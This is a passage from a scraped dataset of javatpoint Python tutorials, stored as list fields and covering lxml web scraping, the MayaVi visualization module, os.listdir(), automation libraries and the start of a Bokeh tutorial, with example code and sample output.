scrapping using the lxml module.', 'Before we move further with the implementation part in this section, we should have to learn some things and only after that we can go ahead with the implementation of web scrapping.', 'We have to follow a stepwise procedure to implement and use the web scrapping and retrieve information from a webpage using this process. Following are the steps we have to follow while using the lxml module for implementing web scrapping:', 'These are the steps that we have to follow sequentially to retrieve the particular content from the webpage. We can implement web scrapping and retrieve content from any web link by following the steps given above.', 'Now, the second question, which is how we can get xpath for a given link and answer to this question is, we have to follow the steps given below to get xpath of a web link:', ""Step 2: We have to select the 'inspect' option from the list of options, and it will open a second on the same URL page where we can find the coding of the URL page with all its elements."", 'Step 4: In this step, we have to go to the copy option and there, we will see a lot of copy options there. The following list of options will appear when we go to the copy option from the list of options:', ""We have to select the 'complete xpath' option, and thus complete xpath of the URL will be copied, and we have to use this xpath in our program during the web scrapping."", 'We should follow these steps while getting the xpath of the URL that we are using in the web scrapping, and we should note that xpath is an important element of the web scraping process.', 'When we are using the lxml module in a Python program to implement web scraping, we have to fix many things before executing the program, which is the following:', 'In this section, we will use a custom URL and then perform the web scrapping on that custom URL, i.e., new releases, by getting its xpath first. We will get the following two important elements from the custom URL we are using in this tutorial:', 'We will use a Python program in each case, and through these programs, we will understand the implementation of the web scrapping process through the lxml module.', ""This implementation method will get the price list from the custom URL in the output using the lxml & requests module's functions. We will use the following example program to get a price list from new releases in this implementation."", ""Lastly, we printed the list of prices in the output using the 'xpathPrices' variable in the print statement, and the program will retrieve the prices list from the web page through web scrapping.""]","['These are two important reasons why web scraping is important and why we have to use web scraping. Now, when we understand how much web scrapping is important in saving time and fetching all the useful information, we all want to learn how to use web scraping. There are multiple methods through which we can implement and use the web scrapping process, and multiple methods to implement the web scraping process is also available in Python.', ""Python provides us with multiple modules, and using these modules; we can implement web scrapping using a Python program. One of such Python modules is the lxml module, and it provides multiple functions' library through which web scrapping can be implemented. We are going to learn Python lxml module in this tutorial and learn how we can implement web scrapping with this module."", 'lxml module of Python is an XML toolkit that is basically a Pythonic binding of the following two C libraries: libxlst and libxml2. lxml module is a very unique and special module of Python as it offers a combination of XML features and speed. In the lxml module, we are provided with multiple functions and using these functions in a Python program; we can easily perform the web scrapping and curate all the useful information from any web page. lxml module of Python also allows us to easily handle all the HTML and XML files along with its application in the web scraping process.', ""lxml module of Python is not an in-built Python library, and that's why if we have to use this module to implement web scraping using a Python program, then first we should make sure that the lxml module is installed in our system or not. And, if the lxml module is not installed in our system, then first we have to install this module and only after that we can proceed with the web scrapping implementation of this module."", 'We have multiple installation methods available for installing the lxml module, and we can use any of these methods according to our choice, but in this section, we will only use the pip installer method for the installation of the lxml module. In the pip installation method, first, we have to open the cmd prompt terminal of our device, and then we have to write the following pip command in the terminal:', 'After writing the command given above in the terminal, we have to press the enter key to initiate the installation process. Once we press the enter key, the installation process for the lxml module will start, and it will take a while to install this module successfully.', ""In steps 4 & 5 of implementing web scrapping, we can find the word 'xpath', which is very important for successfully implementing web scrapping. Now, many of us would ask what 'xpath' is and how we can get the xpath of a web link. We are going to answer both of these questions here in this section."", 'xpath: xpath, which uses a non-XML syntax to provide a flexible way of addressing, stands for XML path language, and through xpath, we can point to different parts of the given xml document (or web page). xpath is used in web scrapping so that the program can address or uniquely identify parts of the web page which has to be retrieved. xpath is an important element in web scrapping because xpath is the only element in the program that specifies the content from the web link that has to be retrieved.', 'Step 1: First, we have to visit the URL on which we want to perform web scraping, and then we have to right-click there, and a pop-up window with a list of options will open. The window that will open after right-clicking on the URL page will be something like the following:', 'Step 3: Now, we have to right-click again in this step, but now we have to right-click on the element window that opened after choosing the inspect option. When we right-click on the div elements, another pop-up window having list of options will open. The window that will open after right-clicking on the inspect page window elements will be something like the following:', 'We have imported the html library from the lxml module and requests module in the program to use their functions to implement web scrapping. After that, we have initialized a URL variable and provided the new releases URL (on which we will be performing web scrapping) in this variable.', ""Then, we used the get() function of the requests module with the URL variable to get data from the URL by sending requests. We have used the get() method inside the getHtml variable, and then we used the fromstring() method on this variable to get the URL's content in the program."", ""We have used the fromstring() in the initialized variable, i.e., docContent(), and used this variable further with the xpath variables. We defined the complete xpath of the URL in the initialized 'xpathComplete' variable using the xpath() function of the lxml module. After that, we defined the xpath for the prices again with the help of the xpath() function in the 'xpathPrices' variable."", 'We will get the price list from the custom URL in the output in this implementation method with the help of web scrapping implemented through lxml and requests module. We will use the following example program in this implementation part for getting the title list from new releases.']","['pip install lxml', 'pip install requests', '# Import requests module in the program', 'import requests', '# Import html from lxml module', 'import lxml.html', '# URL for the source weblink', ""URL = 'https://store.steampowered.com/explore/new/'"", '# Get the request for the URL', 'getHtml = requests.get(URL)', '# Using the fromstring method to get html content', 'docContent = lxml.html.fromstring(getHtml.content)', '# Getting complete xpath from the URL', 'xpathComplete = docContent.xpath(\'//div[@id=""tab_newreleases_content""]\')[0]', '# Getting xpath for the prices from URL', 'xpathPrices = xpathComplete.xpath(\'.//div[@class=""discount_final_price""]/text()\')', '# Print prices from URL in the output', 'print(""The price list from the URL of new releases:"")', 'print(xpathPrices)', '# Import requests module in the program', 'import requests', '# Import html from lxml module', 'import lxml.html', '# URL for the source weblink', ""URL = 'https://store.steampowered.com/explore/new/'"", '# Get the request for the URL', 'getHtml = requests.get(URL)', '# Using the fromstring method to get html content', 'docContent = lxml.html.fromstring(getHtml.content)', '# Getting complete xpath from the URL', 'xpathComplete = docContent.xpath(\'//div[@id=""tab_newreleases_content""]\')[0]', '# Getting xpath for the title from URL', 'xpathTitles = xpathComplete.xpath(\'.//div[@class=""tab_item_name""]/text()\')', '# Print titles from URL in the output', 'print(""The title list from the URL of new releases:"")', 'print(xpathTitles)']","['The price list from the URL of new releases:', 'The title list from the URL of new releases:']",[],"[""|||First, when we have to look for some specific piece of information from a web page, it will take a lot of time if we are directly looking from the web page.|||Second, it is very easy to store and collect all the important information from any website using the web scraping process.||||||We can parse all XML and HTML documents with the lxml module.|||We can even create an XML or HTML document using the etree functionality in a Python program.|||We can even perform multiple operations and search for or retrieve specific information from an HTML or XML document after parsing it with the lxml module.|||We can also perform web scraping using the lxml module's functions in a Python program.||||||Step 1: First, we have to send a web link on which we want to perform web scraping, and then we get the response from the sent web link.|||Step 2: After getting a response from the sent web link, we have to convert the received response object into a byte string.|||Step 3: Next, we have to pass the converted byte string response of the web link to the 'fromstring' method (A method present in the html class of the lxml module).|||Step 4: After passing the response byte string through the 'fromstring' method, we should get to a particular element by using the xpath of the web link we are using for web scrapping.|||Step 5: In the last step, we have retrieved the content from a web page using xpath, and now we can use this content or information according to our need, and we can also save it further uses.||||||Website or webpage we are targeting for web scrapping,|||The information which we want to retrieve, etc.|||&&&|||Price list from the URL|||Title list from the URL|||""]"
390,['Python MayaVi Module'],"[""We all may have heard about Graphical User Interface, known as GUI, and we must have seen its impact in the changing interface of many applications. Basically, GUI or Graphical User Interface is a type of User Interface for applications and software which, instead of text-based user interfaces & typed command labels, allow the users to interact with the computers, smartphones, PCs, etc., through audio indicators and graphical icons such as notations, etc. GUI displays objects and data in such a manner that the information we are trying to display is conveyed very easily through the interactive User Interface provided. Whenever the user interacts with the applications, the object displayed on the electronic devices changes its color, text, and sometimes shape too. Thus, it makes the user's interaction with the electronic devices or applications become more interactive and interesting for the users.""]","['https://www.javatpoint.com/python-os-listdir-method', 'https://www.javatpoint.com/python-lxml-module', 'https://www.javatpoint.com/python-os-listdir-method', 'https://www.javatpoint.com/python-lxml-module', 'https://www.javatpoint.com/python-os-listdir-method']","['https://static.javatpoint.com/python/images/python-mayavi-module.png', 'https://static.javatpoint.com/python/images/python-mayavi-module2.png', 'https://static.javatpoint.com/python/images/python-mayavi-module3.png', 'https://static.javatpoint.com/python/images/python-mayavi-module4.png']",[],['MayaVi Module in Python'],"['MayaVi Module in Python: Vision', 'MayaVi Module in Python: General Characteristics and Features', 'MayaVi Module in Python: Functions', 'MayaVi Module in Python: Installation', 'MayaVi Module in Python: Implementation']","['Note: As we have to build a GUI with the MayaVi module in this tutorial, we will also need NumPy and SciPy modules to perform this implementation. We should make sure that both SciPy and NumPy modules are already installed in our system before moving further with the implementation part of the MayaVi module. If SciPy and NumPy modules are not present in our system, we can use the following pip installer command in the command prompt terminal to install them in our system:']","['Following are the vision for building the Python MayaVi module:', 'These are the major reasons, or we can see the vision behind the development of the MayaVi module.', '(i) For installation of SciPy Module:', '(ii) For installation of NumPy Module:', ""This module is already present in our system, and that's why it has shown here that requirements are already fulfilled."", 'Look at the following Python program with visualization of spherical hormonic function:', 'As we can see, Visualization of the spherical harmonics is plotted in the output with the specified dimensions, values, and features.', 'Explanation:']","['As we can see, the MayaVi module is successfully installed in our system, and now we can start working with this module by importing it into a Python program.', ""This module is already present in our system, and that's why it has shown here that requirements are already fulfilled, and if this module is not present in the system, this command will install it."", 'We have installed all the required modules for the implementation part of the MayaVi module, and therefore, now we can move ahead with the implementation part of it.', 'Then, we used the view() function to set the visualization for the spherical harmonics and savefig() to save the figure in the specified format. Lastly, we used the show() function to show the visualization in the output.']","[""We can see how important GUI has become in today's world, and we can find its use in almost every application we use in our daily lives. Therefore, it becomes even more important that we should have an idea of how to build a GUI and work with it. Most of the programming languages provide us option to create interactive GUIs with the help of their in-built libraries or extensions connected with them. But Python is one of the most popular choices among all these programming languages for creating GUI because it provides us with multiple libraries through which we can easily create a GUI. In Python, we have many in-built modules and some installable modules that we can use to create an interactive GUI by using the functions of these modules in a program. One such Python module is the MayaVi module about which we are going to learn in this tutorial. We will learn about the MayaVi tutorial, how we can install it, its features, and many more about it in this tutorial."", 'MayaVi is a Python module used to visualize scientific data, and it uses VTK to visualize the data. Other than this, the MayaVi module also provides options to develop GUI with the help of the Tkinter library. MayaVi module, which is currently free & distributed under the BSD license, was developed by Prabhu Ramchandran, and it is pronounced as a single name, ""Ma-ya-vee,"" which stands for ""magical"" in English. MayaVi is a cross-platform Python module (runs on almost every platform like UNIX, Windows, or Mac OS X), and it runs on almost every platform or operating system where both VTK and Python are available. The latest version of the MayaVi module, MayaVi2, is very much different from the original one because the latest version is a component of the Enthought suite, which is a suite for the scientific Python programs. The other reason that makes the latest version of the MayaVi module from the original version is that it provides a reusable component for 3D plotting through Python programs and does not just focus on an interactive program (the feature which was lacking in the previous version). Although the latest version of the MayaVi module has a slightly different interface and API than the previous version, it has many new features, which were missing in the previous version.', ""MayaVi module, when developed, was developed with a vision to provide interactive visualization of scientific and other data, but this wasn't the only purpose of developing the MayaVi module. There were some other visions behind the development of the MayaVi module, and we are going to look at all these visions which were behind the development of the MayaVi module in this section."", 'As we have seen in the introduction part of the MayaVi module, this module provides us with multiple functions to visualize scientific data very easily. But this is not the only characteristic of the MayaVi module, which makes it stand out in all the scientific data visualization modules. It also has some other characteristics that make this module very popular in a short time, and we will discuss these characteristics and features of this module in this section. Following are the general characteristics and highlighted features of the MayaVi module:', 'These are some general characteristics and highlighted features of the MayaVi module, and when we go through this list, we will find why this MayaVi module became so popular in a short time. Other than the listed features above, the MayaVi module can also use as a Visualization engine for any application and data with its latest release of Mayavi2.', 'MayaVi library is used to perform multiple functions such as visualization of scientific data, developing a Graphical User Interface, developing 2-D & 3-D figures, etc., by importing this module in a Python program. We can perform all these functions with the help of the MayaVi module or using Mayavi and some other modules together in a program, but for this tutorial, we will only learn about building a Graphical User Interface using the MayaVi module. We will use the MayaVi module with some other modules (which we will discuss later) to build a GUI through a Python program.', 'MayaVi is not an in-built module of Python that comes pre-installed with the Python extension, and therefore, we have to install this module in our system if we want to use and import this module in a Python program. Installation of the MayaVi module is very simple, and it can be done through multiple methods, which include through conda method, through Jupyter notebook method, through pip method, and many more. But in this tutorial, we will only use the pip installer method to perform the installation of the MayaVi module and install this module by using the following pip command in the terminal shell:', 'We have to open the command prompt terminal of our system and write the command given above in it, and after writing the command, press the enter key to start the installation process of the MayaVi module. When we press the enter key, the installation process for the MayaVi module will start, and it will take a while to install the MayaVi module in our system successfully. Because the Mayavi module comes with multiple extensions and library functions, which will be downloaded and installed with it in our system, and pip will also build a wheel for it.', 'In the implementation section, we will only use the MayaVi module to implement its GUI building function, and we will build a spherical harmonic function visualization through it. We will use the MayaVi module in an example program to understand the visualization of the spherical harmonic function by plotting a Graphical User Interface for it in the output. We will also use SciPy and NumPy modules for performing scientific calculations and using trigonometric functions in the program. We can look at the following example program for the implementation of the MayaVi module with the NumPy and SciPy modules.', 'We have first imported scipy, numpy, and mayavi modules in the program. First, have imported linspace, meshgrid, array, sin, cos, pi, and abs function from the numpy module, then we imported sph_harm function as sh from scipy module, and last, we imported mlab as ml from mayavi module for visualization of spherical harmonic motion.', 'After that, we defined 1-D angles using the linspace() function in the OneDTheta and OneDPhi variables. After that, we defined 2-D angles using the OneDTheta & OneDPhi angle in the meshgrid() function and initialized the TwoDTheta and TwoDPhi variables.', 'After that, we defined an array, and inside the array, we used sin and cos identities with 2-D angles we defined earlier. Next, we defined the length and measurement variable with an integer value, and then we used 2-D angles, length, and measurement value inside the sph_harm() function.', ""After that, we have initialized the radius variable to define the sphere's radius using the abs() function. Next, we used the figure() function to define the dimension of the figure, and after that, we used the mesh() function to specify the radius and colors for the figure plotted in the output.""]","['pip install mayavi', 'pip install scipy', 'pip install numpy', '# Import multiple functions from numpy', 'from numpy import linspace, meshgrid, array, sin, cos, pi, abs', '# Import sph_harm from scipy', 'from scipy.special import sph_harm as sh', '# Import mlab from MayaVi', 'from mayavi import mlab as ml', '# Defining 1-D angles from pi values', 'oneDTheta = linspace(0,  pi,  91)', 'oneDPhi   = linspace(0, 2*pi, 181)', '# Defining 2-D angles from 1-D angle values', 'twoDTheta, twoDPhi = meshgrid(oneDTheta, oneDPhi)', '# Using trigonometry values for spheres with 2-D angles', 'xyzTwoD = array([sin(twoDTheta) * sin(twoDPhi),', 'sin(twoDTheta) * cos(twoDPhi),', 'cos(twoDTheta)])', '# Defining length and measurement variable values', 'length = 3', 'measurement = 0', '# Using sph_harm() function with multiple variables', 'yVarLM = sh(measurement, length, twoDPhi, twoDTheta)', '# Defining radius for spherical structure', 'radius = abs(yVarLM.real) * xyzTwoD', '# Size of the figure', 'ml.figure(size=(700, 830))', '# Radius for the figure with colour', 'ml.mesh(radius[0], radius[1], radius[2], scalars = yVarLM.real, colormap = ""cool"")', '# Dimensions for the figure', 'ml.view(azimuth = 0, elevation = 75, distance = 2.4, roll = -50)', '# Saving figure as image', 'ml.savefig(""Y_%i_%i.jpg"" % (length, measurement))', '# Showing figure in output', 'ml.show()']",[],[],"['|||Need for a reusable tool that we can embed in our applications for multiple 3-D plotting for data|||MayaVi also seeks to provide interactive and easy visualization of scientific & other data, and multiple applications|||Harnessing the power of the VTK library Without we are forced to learn about it|||MayaVi was also developed to provide a rich User Interface (mostly focused on GUI) with dialogs in it to interact with all objects and data through visualization of them|||MayaVi was combined with envisaged application-building framework so that we can assemble and access all the domain-specific tools in a single place|||Other than this, the need for a clean and simple scripting interface in Python that includes object-oriented programming, a-la mlab, and one-liners interfaces lead to the development of the MayaVi module||||||MayaVi module is a very convenient option for scientific plotting and data visualization through the mlab (also available through MayaVi extension)|||MayaVi module is very helpful in reading several file formats such as PLOT3D, VTK (XML and Legacy), and many more|||MayaVi module is a cross-platform Python module, and we can easily use these modules in multiple Operating Systems (OS)|||Scriptability of the mayavi module is very easy by using Python|||MayaVi module can save rendered visualization of data in multiple image formats for user convenience|||We can script the Mayavi module from the Python interpreter or import it as a Python module in the program|||It provides and works as a pipeline browser with which objects that are present in the VTK pipeline can be browsed and edited|||The Extendibility of the MayaVi module is very simple and easy, which means we can extend the MayaVi module through various custom sources, file formats, data filters, and modules|||With the Mayavi module, visualization of tensor (in 2-D & 3-D), vector, or scalar data is possible and very easy|||With the Mayavi module, we can import simple 3D studio and VRML scenes|||']"
391,['Python os.listdir() method'],"[""It is quite possible that we have come across so many instances in our life where we want to know how many and what files are present in a directory (folder). Or, sometimes we have to look for a file, and we know its name, but we don't know in which folder it is present. In that case, the only option left for us is to look for the file in the destination directory.""]","['https://www.javatpoint.com/python-modules-for-automation', 'https://www.javatpoint.com/python-mayavi-module', 'https://www.javatpoint.com/python-modules-for-automation', 'https://www.javatpoint.com/python-mayavi-module', 'https://www.javatpoint.com/python-modules-for-automation']",[],[],"['os.listdir() Method in Python', 'os.listdir() Method: Implementation:', 'Conclusion']","['Syntax for os.listdir() function:', 'Parameters:', 'Return type:', 'Method 1: Printing File Names from Current Working Directory:', 'Method 2: Printing File Names from Specified Path:']",[],"['Following is the syntax for using the listdir() function from the os module:', ""The return type for the listdir() function is 'list' as it returns a list of names of all the files present in the specified directory."", 'We will use an example program for each category and get the file names in each method.', 'Example 1: ', 'Look at the following Python program where we used os.listdir() method with path argument:', ""As we can see, the names of all the files present in our current working directory are printed in the program's output."", 'Explanation:', 'Example 2:', 'Look at the following Python program where we used the os.listdir() method without any argument:', 'Explanation:', 'Example 3:', 'Look at the following Python program where we used os.listdir() method with path argument:', ""As we can see, the names of all the files present in the specified directory are printed in the program's output."", 'Explanation:']","['As we can see in the above-given syntax, we have only given an argument inside the listdir() method. listdir() function takes the following path parameter:', 'To understand the working and implementation of the listdir() function, we will use it in an example program and print the list of filenames from it. We have divided the implementation part of the listdir() function into the following two parts:', 'In this method, we will print the list of file names from the current working directory by using another function of the os module, i.e., the getcwd() function. Look at the following example program to understand the implementation of this method:', 'As we can see, a list of names of all the files present in the current file where Python is installed is printed in the output after the program is executed.']","[""Now, it would seem so easy for many of us to think; we just have to go to the directory and look there. This is a possible option, but this option will only work when we only have a smaller number of files present in that directory. Only then can we visit that directory manually and look for the files present there. But, what in the case where a large number of files, let's just say thousands of files present in the destination directory. In that case, this option will not work because it is going to take very long (even many days) to search if a specific file is present in the destination directory where thousands of files are present. It seems like what we should do if we have to find a file with its name within a directory having thousands of files."", 'We can search for the name through file explorer, but if we do that, it is also going to take a lot of time, not as in the previous option but yes, a lot of time. This is because file explorer will scan through every file present in the directory, and we have to wait so much until complete scanning of the disk is done.', 'But what if we say that we have already provided the names of all the files present in the destination directory or path. Then, it will be going to be very easy for us to check if that specified file is present in the targeted path, and it also shows where we need to get the names of all the files present in the destination directory.', 'If we are given a list of names of all the files present in a directory in text form, we just have to type the name of that specific file in the search bar. And, then, it will hardly take a second to find out if the file is present in the list of names or not. Thus, we can understand that how much it is important to have a method where we can print the list of names of all files present in a directory or path.', ""Python provides us with such methods where we can print the list of names, and one such method is the listdir() function of the 'os' module. We are going to learn this listdir() method in this tutorial and use this in a Python program to print a list of names of all files present in the specified path."", 'The listdir() function is a function provided by the os module, and by using this function, we can print a list of names of all the files present in the specified path. listdir() method can also be used if we want to print the list of files present in the current working directory (where the program is present). We can use the listdir() method whenever we are required to get the names of all files present in a specified directory.', ""After importing the os module in the program, we have used the getcwd() function to get the path of the current working directory. We have initialized a variable with the name 'pathSpecified' and stored the path of the current working directory in this variable. After that, we have used the listdir() function in another initialized variable, i.e., listOfFileNames, to store the name of all files in this variable. We have provided initialized variable for the current working path as an argument in the listdir() function, and lastly, we printed the list of all names in the output using a print statement."", ""If we don't want to use any other function in our program, then we can also get all the file names from the current directory in which the program is present. We just have to leave the listdir() function instead of providing any directory's path as an argument, and after that, the program, when executed, will give the list of all the names present in the current directory as a result in the output. Look at the following example program to understand the implementation of this method:"", ""In this program, we have omitted the path parameter and still get the list of names of all the files present in the current working directory. We will prefer to use this method if we want to get the list of all the files ' names from the current working directory. Because in this method, we don't have to use any argument or define any path variable, and thus it saves any extra line of code in our program and saves our time."", ""In this method, we can get the list of names of all the files present in a specified directory by providing the specified path of the directory inside the listdir() function. We can get the path of the directory from the file's properties option, and then we can use the same file in the program. Look at the following example program to understand the implementation of this method:"", 'After importing the os module in the program, we have first defined the path of the directory from where we want to print the list of all file names by initializing a path variable. After that, we used the initialized path variable inside the listdir() method to use the path as an argument in the function. Lastly, we used another initialized variable (listOfFileNames) inside the print statement to print the result in the output.', 'We learned about the listdir() method of the os module in this tutorial and understood the importance of this function. We learn about the syntax of this function, and after that, we learn the methods to use this function. In last, we used the Python program with the listdir() function to understand the implementation of each method.']","['>> os.listdir(pathSpecified)', '# Import os module', 'import os', '# Use getcwd() function', 'pathSpecified = os.getcwd()', '# Using listdir() function', 'listOfFileNames = os.listdir(pathSpecified)', '# Print the name of all files in the current working directory', 'print(""Following is the list of names of all the files present in the current working directory: "")', 'print(listOfFileNames)', '# Import os module', 'import os', '# Using listdir() function', 'listOfFileNames = os.listdir()', '# Print the name of all files in the current working directory', 'print(""Following is the list of names of all the files present in the current working directory: "")', 'print(listOfFileNames)', '# Import os module', 'import os', '# Define the specified path', 'pathSpecified = "" C:\\Users\\Manish\\Downloads""', '# Using listdir() function', 'listOfFileNames = os.listdir(pathSpecified)', '# Print the name of all files in directory', 'print(""Following is the list of names of all the files present in the specified directory: "")', 'print(listOfFileNames)']","['Following is the list of names of all the files present in the current working directory:', ""['.ipynb_checkpoints', '1510981730952-33afef2b-eb41-4592-8d3f-bd3e19932d36_.pdf', '1510981730952-33afef2b-eb41-4592-8d3f-bd3e19932d36__19.jpg', '1527589430558.jpg', '1605467180870.png', '1605467180879.png', '160591-fruit-template-16x9.pptx', '1613034967066.jpg', '1613034967083.jpg', '1613035079325.jpg', '1613035270313.jpg', '1616159417742.jpg', '1616159417758.jpg', ???., Windows11InstallationAssistant.exe', 'WindowsPCHealthCheckSetup.msi', 'Word frequency Python.edited.docx', 'wrong.jpg', 'X-ray image.png', 'XML-data.xml', 'yemen500.png', 'zambia-500.png', 'zimbabwe-500.png', 'ZoomInstaller (1).exe', 'ZoomInstaller.exe', '__pycache__', '~$EOC CERTIFICATE.pptx']"", 'Following is the list of names of all the files present in the current working directory:', ""['.ipynb_checkpoints', '1510981730952-33afef2b-eb41-4592-8d3f-bd3e19932d36_.pdf', '1510981730952-33afef2b-eb41-4592-8d3f-bd3e19932d36__19.jpg', '1527589430558.jpg', '1605467180870.png', '1605467180879.png', '160591-fruit-template-16x9.pptx', '1613034967066.jpg', '1613034967083.jpg', '1613035079325.jpg', '1613035270313.jpg', '1616159417742.jpg', '1616159417758.jpg', ???., Windows11InstallationAssistant.exe', 'WindowsPCHealthCheckSetup.msi', 'Word frequency Python.edited.docx', 'wrong.jpg', 'X-ray image.png', 'XML-data.xml', 'yemen500.png', 'zambia-500.png', 'zimbabwe-500.png', 'ZoomInstaller (1).exe', 'ZoomInstaller.exe', '__pycache__', '~$EOC CERTIFICATE.pptx']"", 'Following is the list of names of all the files present in the specified directory:', ""['.ipynb_checkpoints', '1510981730952-33afef2b-eb41-4592-8d3f-bd3e19932d36_.pdf', '1510981730952-33afef2b-eb41-4592-8d3f-bd3e19932d36__19.jpg', '1527589430558.jpg', '1605467180870.png', '1605467180879.png', '160591-fruit-template-16x9.pptx', '1613034967066.jpg', '1613034967083.jpg', '1613035079325.jpg', '1613035270313.jpg', '1616159417742.jpg', '1616159417758.jpg', ........, Windows11InstallationAssistant.exe', 'WindowsPCHealthCheckSetup.msi', 'Word frequency Python.edited.docx', 'wrong.jpg', 'X-ray image.png', 'XML-data.xml', 'yemen500.png', 'zambia-500.png', 'zimbabwe-500.png', 'ZoomInstaller (1).exe', 'ZoomInstaller.exe', '__pycache__', '~$EOC CERTIFICATE.pptx']""]",[],"[""|||pathSpecified: Here, the pathSpecified variable represents the path of the targeted directory from where we want to know the name of all files. This is an optional argument in the listdir() function, and if we don't provide a specified path inside the function, then it will print all the file names from the current working directory.|||&&&|||Printing file names from the current working directory|||Printing file names from the specified path|||""]"
392,['Python Modules for Automation'],"['In the following tutorial, we will discuss some of the best Python modules or tools that are used for automation and testing. There can be various issues while producing software, and Automation and Testing are one of the best ways to resolve these problems without spending a lot of time. Using this method, we can test the programs and check every case. There are several well-known languages like Java and Python that are used for automation and software testing. The following tutorial mainly focuses on some of the widely used modules in the Python programming language for automation and software testing.']","['https://www.javatpoint.com/data-visualization-in-python-using-bokeh-library', 'https://www.javatpoint.com/python-os-listdir-method', 'https://www.javatpoint.com/data-visualization-in-python-using-bokeh-library', 'https://www.javatpoint.com/python-os-listdir-method', 'https://www.javatpoint.com/data-visualization-in-python-using-bokeh-library']",[],[],"['Understanding the Full-Stack Automation', 'Understanding the Importance of Full-Stack Automation', 'List of Python modules for Automation and Testing', 'The Conclusion']","['The Robot Framework', 'The PyTest module', 'The Splinter library', 'The Behave library', 'The Pywinauto library', 'The Automagica module', 'The Beautiful Soup library', 'The PDFMiner library', 'The Locust Framework']",[],"[""So, let's get begun."", 'Now, let us discuss these Python modules and tools in brief.', 'For more details, one can read the official documentation of the Robot Framework.', 'For more details, one can read the official documentation of the PyTest module.', 'For more details, one can read the official documentation of the Splinter library.', 'For more details, one can read the official documentation of the Behave library.', 'For more details, one can read the official documentation of the Pywinauto library.', 'For more details, one can read the official documentation of the Automagica module.', 'For more details, one can read the official documentation of the Beautiful Soup library.', 'For more details, one can read the official documentation of the PDFMiner library.', 'For more details, one can read the official documentation of the Locust Framework.']",['There are different modules and tools available in Python that can be used for Automation and Software Testing. Some of these modules and tools are listed below:'],"['In this modern world, automation can be considered necessary in order to achieve optimization, efficiency, and best practices in the process of any business. This process of automation is also critical for IT operations, specifically while utilizing SAP as the most crucial application in the landscape of the organization. A full-stack automation process will handle complex applications that are going to drive some significant business operations. This system will also provide more than one platform, geography, tool, as well as technology.', 'There are a lot of advantages that we will get from this full-stack automation process. It will trigger faster development cycles, fewer bugs in the IT system, less confusion, and quicker resolution of application problems. Once we apply this automation to the company, we can save a lot of money and increase the overall productivity of the business. If some of us are using the Python programming language for our business, this tutorial may be the best choice. We are going to share some automation libraries and utilities that are available in Python.', 'The Python programming language provides a framework called the Robot Framework that we can use in order to test the automation process in the company. This framework uses the keyword-driven approach, so it can make the tests easy to create and readable. We can use the Robot Framework to test many other things, like MongoDB, Android, Mainframe, FTP, Appium, and a lot more.', 'PyTest is among the most famous automation frameworks in various languages. This module is very concise so that it can focus on testing. We can write some other methods when utilizing this platform, and they are marked as events and can be utilized in order to make the entire operation reusable and scalable.', 'Splinter is an awesome wrapper-type library that is specifically designed for Selenium in the Python programming language. It is a free, open-source utility that can be utilized in order to test web applications with Python. We can use this library to automate the browser operations, like interaction with other objects, visiting URLs, and a lot more.', 'Whenever we want to select a behavior-driven library used for development purposes, the Behave library serves the best. his framework has several similarities to Cucumber. However, the Behave library is specifically designed and developed in the Python programming language.', 'Python also offers a platform that allows automation based on non-browser functionality. This Python library is known as the Pywinauto library and is a set of Python modules that are utilized in order to automate the Windows Graphical User Interface (GUI). This automation will handle complex operations like the extraction of information and text data.', 'The Automagica module of the Python programming language is among the most famous open-source intelligent robotic process automation or SPRA platforms. We can utilize this platform in order to automate several cross-platform functions. For instance, file and folder operations, manipulating a PDF file, automating a browser, e-mail business, and a lot more. We can use this utility to speed up the entire process of software development.', 'Python also provides another yet famous library known as Beautiful Soup that allows programmers to extract data from HTML and XML files. Most programmers generally have a series of frameworks that will consist of several scripts to help Python, and these scripts do use this utility effectively and efficiently.', 'If we want to perform a series of examinations of the PDF file, we may want to consider having a utility like the PDFMiner library. This library acts as a text extraction utility allowing programmers to extract any PDF documents. We can verify and test any PDF files when we are working with the PDFMiner library properly.', 'The Locust Framework is another amazing framework specifically designed for software testing purposes with the help of the Python programming language. This framework is an easy-to-use load testing utility, and it allows programmers to find out the number of users that can be handled by the system. It has a friendly web-based user interface (UI) that allows programmers to access various features and advantages from this utility.', 'As software developers, most of us may want to know the best utility that can be used for Automation and Software Testing purposes in order to automate or test any of their day-to-day activities. Python can be a powerful automation programming language that we need to have. It is easy for us to connect this utility with other tools, libraries, and platforms available today. Once we know how to combine these tools, we can easily automate some of our activities.']",[],[],[],['|||Robot Framework|||PyTest|||Splinter|||Selenium|||Behave|||Pywinauto|||Automagica|||Beautiful Soup|||PDFMiner|||Locust Framework|||']
393,['Data Visualization in Python using Bokeh Library'],"['Bokeh is a Python library which is used for data visualization through high-performance interactive charts and plots. It creates its plots using HTML and JavaScript languages. The output of the bokeh library can be generated on several platforms such as browser, HTML, server, and notebook. It is also possible to create the bokeh plots in Django and flask applications.']","['https://www.javatpoint.com/how-to-plot-glyphs-over-a-google-map-by-using-bokeh-library-in-python', 'https://www.javatpoint.com/python-modules-for-automation', 'https://www.javatpoint.com/how-to-plot-glyphs-over-a-google-map-by-using-bokeh-library-in-python', 'https://www.javatpoint.com/python-modules-for-automation', 'https://www.javatpoint.com/how-to-plot-glyphs-over-a-google-map-by-using-bokeh-library-in-python']","['https://static.javatpoint.com/python/images/data-visualization-in-python-using-bokeh-library.png', 'https://static.javatpoint.com/python/images/data-visualization-in-python-using-bokeh-library2.png', 'https://static.javatpoint.com/python/images/data-visualization-in-python-using-bokeh-library3.png', 'https://static.javatpoint.com/python/images/data-visualization-in-python-using-bokeh-library4.png', 'https://static.javatpoint.com/python/images/data-visualization-in-python-using-bokeh-library5.png', 'https://static.javatpoint.com/python/images/data-visualization-in-python-using-bokeh-library6.png']",[],['Conclusion'],"['Installation:', 'Code 1: To Create Scatter Circle Markers', 'Code 2: To Create a Single Line', 'Code 3: To Create a Bar chart', 'Code 4: To Create Box Plot', 'Code 5: To Create Scatter Plot']",[],"['The bokeh library provides two visualization interfaces to the users:', 'In this tutorial, we will learn how to create different types of data visualization graphs and charts using the bokeh library in Python.', 'To install the bokeh library, we can use the following command:', 'We can create Scatter Circle Markers on the Plot by using the bokeh library. For this, we will use the circle() function.', 'We can create a single line by using the bokeh library in Python. For this, we will use the line() function.', 'Example: Vertical Bar Chart', 'Example 2: Horizontal Bar Chart']","['Bar charts are used for representing the categorical data with rectangular bars. The length of the bar is proportional to the values they are representing.', 'Box plot is used for representing the statistical data on the plots, and it is helpful for summarizing the statistical properties of several groups present in the dataset.', 'A Scatter plot is used for plotting values of two variables in a dataset. It is helpful in finding the correlation between the two variables which are selected.', 'In this tutorial, we have 